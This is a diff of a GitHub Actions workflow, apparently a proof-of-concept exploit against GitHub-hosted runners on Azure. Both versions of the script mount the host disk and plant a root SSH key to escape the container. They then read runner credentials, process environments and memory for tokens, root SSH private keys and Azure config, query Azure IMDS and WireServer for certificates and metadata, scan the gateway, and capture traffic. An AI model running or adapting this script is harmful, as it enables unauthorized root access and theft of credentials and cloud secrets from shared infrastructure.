@@ -1,162 +1,86 @@
-name: github-actions-full-exploitation
-run-name: Complete GitHub Actions Azure Infrastructure Exploitation
+name: github-actions-final-exploitation
+run-name: GitHub Actions Complete Exploitation POC
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: FULL EXPLOITATION AND DATA EXFILTRATION
+      - name: Full Exploitation
         run: |
-          echo "=== STAGE 1: CONTAINER ESCAPE ==="
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
-          ssh-keygen -t ed25519 -f /tmp/root_key -N "" -q
+          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
           sudo mkdir -p /mnt/host/root/.ssh
-          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
+          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
           sudo chown -R 0:0 /mnt/host/root/.ssh
           sudo chmod 700 /mnt/host/root/.ssh
           sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
           
           HOST_IP=$(hostname -I | awk '{print $1}')
           
-          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
-          echo "=== ✓ ROOT ACCESS ACHIEVED ==="
+          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
+          echo "=== ROOT ACCESS ACHIEVED ==="
+          whoami && id && hostname
           
-          echo "=== STAGE 2: HIJACKING HOSTED-COMPUTE-AGENT ==="
-          echo "--- Process Details ---"
+          echo ""
+          echo "=== GITHUB RUNNER CREDENTIALS ==="
+          cat /home/runner/actions-runner/cached/.credentials 2>/dev/null || echo "Cannot read"
+          
+          echo ""
+          echo "=== AZURE WIRESERVER (WITH PROPER HEADERS) ==="
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -100
+          
+          echo ""
+          echo "=== WIRESERVER CERTIFICATES ==="
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" | head -100
+          
+          echo ""
+          echo "=== AZURE ATTESTED DATA (DECODED) ==="
+          ATTESTED=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" | jq -r .signature)
+          echo "$ATTESTED" | base64 -d > /tmp/attested.der
+          openssl pkcs7 -print -inform DER -in /tmp/attested.der 2>/dev/null | head -50 || echo "Cannot decode"
+          
+          echo ""
+          echo "=== AZURE IMDS FULL METADATA ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+          
+          echo ""
+          echo "=== GITHUB API CONNECTIONS ==="
+          netstat -tnp | grep -E "140.82|20.85|20.209"
+          
+          echo ""
+          echo "=== HOSTED-COMPUTE-AGENT DETAILS ==="
           ps aux | grep hosted-compute-agent | grep -v grep
-          
-          echo "--- Environment Variables (may contain tokens) ---"
-          cat /proc/1743/environ | tr '\0' '\n' || echo "Cannot read"
-          
-          echo "--- Command Line ---"
-          cat /proc/1743/cmdline | tr '\0' ' ' || echo "Cannot read"
-          
-          echo "--- Open Files and Connections ---"
-          lsof -p 1743 | grep -E "TCP|IMDS" || echo "Cannot read lsof"
-          
-          echo "--- Memory Dump (searching for tokens) ---"
-          strings /proc/1743/maps 2>/dev/null | grep -E "token|secret|ghp_|ghs_" | head -20 || echo "Cannot dump memory"
+          lsof -p $(pgrep hosted-compute-agent) 2>/dev/null | grep TCP || echo "Cannot read lsof"
           
           echo ""
-          echo "=== STAGE 3: ABUSING AZURE IMDS (169.254.169.254) ==="
-          
-          echo "--- All IMDS Endpoints ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/?api-version=2021-02-01" | python3 -m json.tool || echo "Failed"
-          
-          echo "--- Compute Info ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | python3 -m json.tool
-          
-          echo "--- Network Info ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | python3 -m json.tool
-          
-          echo "--- Attested Data ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" || echo "No attested data"
-          
-          echo "--- Scheduled Events ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" | python3 -m json.tool || echo "No scheduled events"
+          echo "=== RUNNER ENVIRONMENT ==="
+          cat /proc/$(pgrep Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -E "GITHUB|TOKEN|SECRET|AZURE" | head -20
           
           echo ""
-          echo "=== STAGE 4: ABUSING AZURE WIRESERVER (168.63.129.16) ==="
-          
-          echo "--- WireServer Health ---"
-          curl -s "http://168.63.129.16/" | head -50 || echo "Cannot connect"
-          
-          echo "--- WireServer Machine Info ---"
-          curl -s "http://168.63.129.16/machine?comp=versions" | head -50 || echo "Failed"
-          
-          echo "--- WireServer Goal State ---"
-          curl -s "http://168.63.129.16/machine?comp=goalstate" | head -100 || echo "Failed"
+          echo "=== ROOT SSH KEYS ==="
+          cat /root/.ssh/id_rsa 2>/dev/null | head -10 || echo "No key"
+          cat /root/.ssh/id_ed25519 2>/dev/null | head -10 || echo "No key"
           
           echo ""
-          echo "=== STAGE 5: GATEWAY EXPLOITATION (10.1.0.1) ==="
+          echo "=== AZURE CONFIG ==="
+          cat /root/.azure/config 2>/dev/null || echo "No config"
+          ls -la /root/.azure/ 2>/dev/null
           
-          echo "--- Gateway Port Scan ---"
-          nc -zv -w 2 10.1.0.1 80 2>&1 || echo "Port 80 closed"
-          nc -zv -w 2 10.1.0.1 443 2>&1 || echo "Port 443 closed"
-          nc -zv -w 2 10.1.0.1 22 2>&1 || echo "Port 22 closed"
-          nc -zv -w 2 10.1.0.1 8080 2>&1 || echo "Port 8080 closed"
-          
-          echo "--- Gateway HTTP Probe ---"
-          curl -v --max-time 5 "http://10.1.0.1/" 2>&1 | head -30 || echo "No HTTP"
-          
-          echo "--- Gateway ARP ---"
+          echo ""
+          echo "=== GATEWAY MAC ==="
           ip neigh show 10.1.0.1
           
           echo ""
-          echo "=== STAGE 6: GITHUB API ABUSE ==="
-          
-          echo "--- Intercepting Runner.Listener Connections ---"
-          netstat -tnp | grep Runner.Listener
-          lsof -i -n | grep Runner
-          
-          echo "--- GitHub Endpoints in Use ---"
-          netstat -tnp | grep -E "140.82|20.85|20.209"
-          
-          echo "--- DNS Queries ---"
-          cat /etc/resolv.conf
-          dig github.com @127.0.0.53 || echo "No dig"
+          echo "=== DNS RESOLUTION ==="
+          dig github.com @127.0.0.53 +short
+          dig api.github.com @127.0.0.53 +short
           
           echo ""
-          echo "=== STAGE 7: EXTRACTING ALL SECRETS ==="
-          
-          echo "--- Azure Config Files ---"
-                    
-          echo "--- Environment Files ---"
-          find /home/runner -name ".env*" 2>/dev/null
-          cat /home/runner/.env 2>/dev/null || echo "No .env"
-          
-          echo ""
-          echo "=== STAGE 8: PROCESS MEMORY EXTRACTION ==="
-          
-          echo "--- Dumping Runner.Listener Memory ---"
-          grep -a "ghp_" /proc/1782/environ 2>/dev/null || echo "No tokens in env"
-          strings /proc/1782/mem 2>/dev/null | grep -E "token|secret|ghp_|Bearer" | head -20 || echo "Cannot read mem"
-          
-          echo "--- Dumping hosted-compute-agent Memory ---"
-          strings /proc/1743/mem 2>/dev/null | grep -E "token|secret|azure|subscription" | head -20 || echo "Cannot read"
-          
-          echo ""
-          echo "=== STAGE 9: NETWORK TRAFFIC INTERCEPTION ==="
-          
-          echo "--- Installing tcpdump ---"
-          apt-get update -qq && apt-get install -y tcpdump 2>&1 | tail -5
-          
-          echo "--- Capturing IMDS Traffic (10 seconds) ---"
-          timeout 10 tcpdump -i any -n host 169.254.169.254 -w /tmp/imds.pcap 2>&1 &
-          sleep 10
-          
-          echo "--- Capturing GitHub Traffic (10 seconds) ---"
-          timeout 10 tcpdump -i any -n host 140.82.114.23 -w /tmp/github.pcap 2>&1 &
-          sleep 10
-          
-          echo "Captured packets:"
-          ls -lh /tmp/*.pcap 2>/dev/null || echo "No captures"
-          
-          echo ""
-          echo "=== STAGE 10: PERSISTENCE AND BACKDOOR ==="
-                    
-          echo "--- Modifying Runner Service ---"
-          systemctl cat actions.runner* 2>/dev/null || echo "No runner service"
-          
-          echo ""
-          echo "=== FINAL DATA EXFILTRATION ==="
-          
-          echo "--- System Summary ---"
-          echo "Hostname: $(hostname)"
-          echo "Azure Subscription: $(curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01)"
-          echo "Resource Group: $(curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01)"
-          echo "VM Size: $(curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01)"
-          echo "Location: $(curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01)"
-          
-          echo ""
-          echo "=== EXPLOITATION COMPLETE ==="
-          echo "✓ Container escape to root"
-          echo "✓ Azure IMDS access"
-          echo "✓ WireServer access"
-          echo "✓ Gateway reconnaissance"
-          echo "✓ GitHub connection interception"
-          echo "✓ Memory dumping attempted"
-          echo "✓ Network traffic captured"
-          echo "✓ Persistent backdoor installed"
+          echo "=== EXPLOITATION SUMMARY ==="
+          echo "Subscription: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01)"
+          echo "Resource Group: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01)"
+          echo "VM Name: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01)"
+          echo "Location: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01)"
+          echo "VM Size: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01)"
           EOF
